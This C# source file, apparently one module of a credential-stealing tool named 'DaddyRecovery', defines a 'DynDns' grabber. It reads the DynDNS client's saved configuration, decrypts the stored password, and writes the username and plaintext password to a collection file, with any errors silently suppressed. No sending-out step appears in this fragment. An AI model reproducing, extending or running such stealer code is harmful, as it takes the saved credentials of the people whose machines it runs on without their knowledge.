namespace DaddyRecovery.Applications
{
    using System;
    using System.IO;
    using Helpers;

    public static class DynDns
    {
        public static void Inizialize_Grabber()
        {
            if (CombineEx.ExistsFile(GlobalPath.DynDns))
            {
                try
                {
                    string[] lines = File.ReadAllLines(GlobalPath.DynDns);
                    if (lines.Length != 0)
                    {
                        CombineEx.CreateFile(true, GlobalPath.DynDnsSave, $"UserName: {lines[1].Substring(9)}\r\nPassword: { DecryptTools.DecryptDynDns(lines[2].Substring(9))}{Environment.NewLine}");
                    }
                }
                catch { }
            }
        }
    }
}